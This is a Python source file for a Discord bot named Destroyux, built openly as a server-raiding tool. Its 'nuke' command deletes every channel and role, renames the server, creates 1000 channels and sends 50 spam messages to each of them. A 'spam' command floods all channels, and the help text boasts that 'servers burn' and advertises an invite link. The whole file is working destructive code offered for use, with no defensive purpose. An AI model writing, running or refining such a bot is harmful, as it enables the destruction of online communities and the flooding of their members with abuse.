# main.py
import discord
from discord.ext import commands
import asyncio
import os
from dotenv import load_dotenv
from typing import Optional

load_dotenv()

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.guilds = True

bot = commands.Bot(command_prefix=["!", "/"], intents=intents)

class DestroyuxBot(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
    
    # ===== NUKE COMMAND (EXTREME SPEED) =====
    @commands.hybrid_command(name="nuke", description="Nuke - 1000 channels, spam all")
    @commands.is_owner()
    async def nuke(self, ctx,
                   channel_name: str = "destroyed",
                   spam_message: str = "NUKED BY DESTROYUX"):
        """
        /nuke [channel_name] [spam_message]
        !nuke destroyed "OWNED"
        
        Creates 1000 channels, spams all, auto server name
        """
        
        if isinstance(ctx, commands.Context):
            await ctx.defer()
        else:
            await ctx.response.defer()
        
        guild = ctx.guild
        
        # Step 1: Delete all existing channels (fire and forget)
        delete_tasks = []
        for channel in list(guild.channels):
            delete_tasks.append(asyncio.create_task(self._delete_fast(channel)))
        
        # Step 2: Delete all roles (fire and forget)
        for role in list(guild.roles):
            if role.name != "@everyone":
                delete_tasks.append(asyncio.create_task(self._delete_role_fast(role)))
        
        # Step 3: Change server name instantly
        try:
            await guild.edit(name="Nuked By Destroyux")
        except:
            pass
        
        # Step 4: Create 1000 channels at MAX SPEED
        create_tasks = []
        for i in range(1000):
            create_tasks.append(asyncio.create_task(guild.create_text_channel(f"{channel_name}-{i}")))
        
        new_channels = []
        for task in create_tasks:
            try:
                ch = await task
                new_channels.append(ch)
            except:
                pass
        
        # Step 5: Spam ALL 1000 channels (EXTREME SPEED - fire and forget)
        spam_count = 0
        for channel in new_channels:
            try:
                # Fire 50 messages per channel without waiting
                for _ in range(50):
                    asyncio.create_task(channel.send(spam_message))
                    spam_count += 1
            except:
                pass
        
        reply = f"⚡ NUKED: {len(new_channels)} channels created | ~{spam_count} messages spammed"
        
        if isinstance(ctx, commands.Context):
            await ctx.send(reply)
        else:
            await ctx.followup.send(reply)
    
    # ===== SPAM COMMAND =====
    @commands.hybrid_command(name="spam", description="Spam all channels with custom message")
    @commands.is_owner()
    async def spam(self, ctx,
                   count: int = 100,
                   message: Optional[str] = None):
        """
        /spam [count] [message]
        !spam 100 "RAIDED"
        """
        
        if isinstance(ctx, commands.Context):
            await ctx.defer()
        else:
            await ctx.response.defer()
        
        guild = ctx.guild
        msg = message or "DESTROYED BY DESTROYUX"
        
        channels = [ch for ch in guild.text_channels 
                   if ch.permissions_for(guild.me).send_messages]
        
        # EXTREME SPEED: Fire all messages without waiting
        total = 0
        for channel in channels:
            try:
                for _ in range(count):
                    asyncio.create_task(channel.send(msg))
                    total += 1
            except:
                pass
        
        reply = f"⚡ SPAMMED: ~{total} messages across {len(channels)} channels"
        
        if isinstance(ctx, commands.Context):
            await ctx.send(reply)
        else:
            await ctx.followup.send(reply)
    
    # ===== HELP COMMAND =====
    @commands.hybrid_command(name="help", description="Show destroyux commands")
    async def help_cmd(self, ctx):
        """Display all available commands"""
        
        if isinstance(ctx, commands.Context):
            await ctx.defer()
        else:
            await ctx.response.defer()
        
        help_text = """```
╔═══════════════════════════════════════════════╗
║         DESTROYUX - EXTREME SPEED            ║
║         Credit: m3oza                        ║
╚═══════════════════════════════════════════════╝

/nuke [channel_name] [spam_message]
!nuke destroyed "OWNED"

  ⚡ INSTANT NUKE:
  • Deletes ALL channels + roles
  • Creates 1000 channels (customizable name)
  • Spams all 1000 channels (50 messages each)
  • Auto server name: "Nuked By Destroyux"
  • Fire-and-forget async (EXTREME SPEED)

Examples:
  /nuke destroyed "PWNED"
  !nuke chaos "FUCKED"
  /nuke spam "RAIDED"

───────────────────────────────────────────────

/spam [count] [message]
!spam 100 "DESTROYED"

  ⚡ SPAM ALL CHANNELS:
  • Spam every channel instantly
  • Customizable message
  • Customizable count per channel

Examples:
  /spam 500 "OWNED"
  !spam 1000 "DESTROYED"

───────────────────────────────────────────────

STATUS: servers burn | .gg/m3oza
SPEED: ⚡⚡⚡ FIRE & FORGET ASYNC
```"""
        
        if isinstance(ctx, commands.Context):
            await ctx.send(help_text)
        else:
            await ctx.followup.send(help_text)
    
    # Ultra-fast deletion (no error handling overhead)
    async def _delete_fast(self, channel):
        try:
            await channel.delete()
        except:
            pass
    
    async def _delete_role_fast(self, role):
        try:
            await role.delete()
        except:
            pass

@bot.event
async def on_ready():
    print(f"[+] destroyux ONLINE as {bot.user}")
    print(f"[+] SPEED MODE: EXTREME")
    try:
        synced = await bot.tree.sync()
        print(f"[+] Synced {len(synced)} slash commands")
    except Exception as e:
        print(f"[-] Sync error: {e}")
    
    # Watching status
    await bot.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.watching,
            name="servers burn | .gg/m3oza"
        )
    )

async def main():
    async with bot:
        await bot.add_cog(DestroyuxBot(bot))
        await bot.start(os.getenv("BOT_TOKEN"))

if __name__ == "__main__":
    asyncio.run(main())
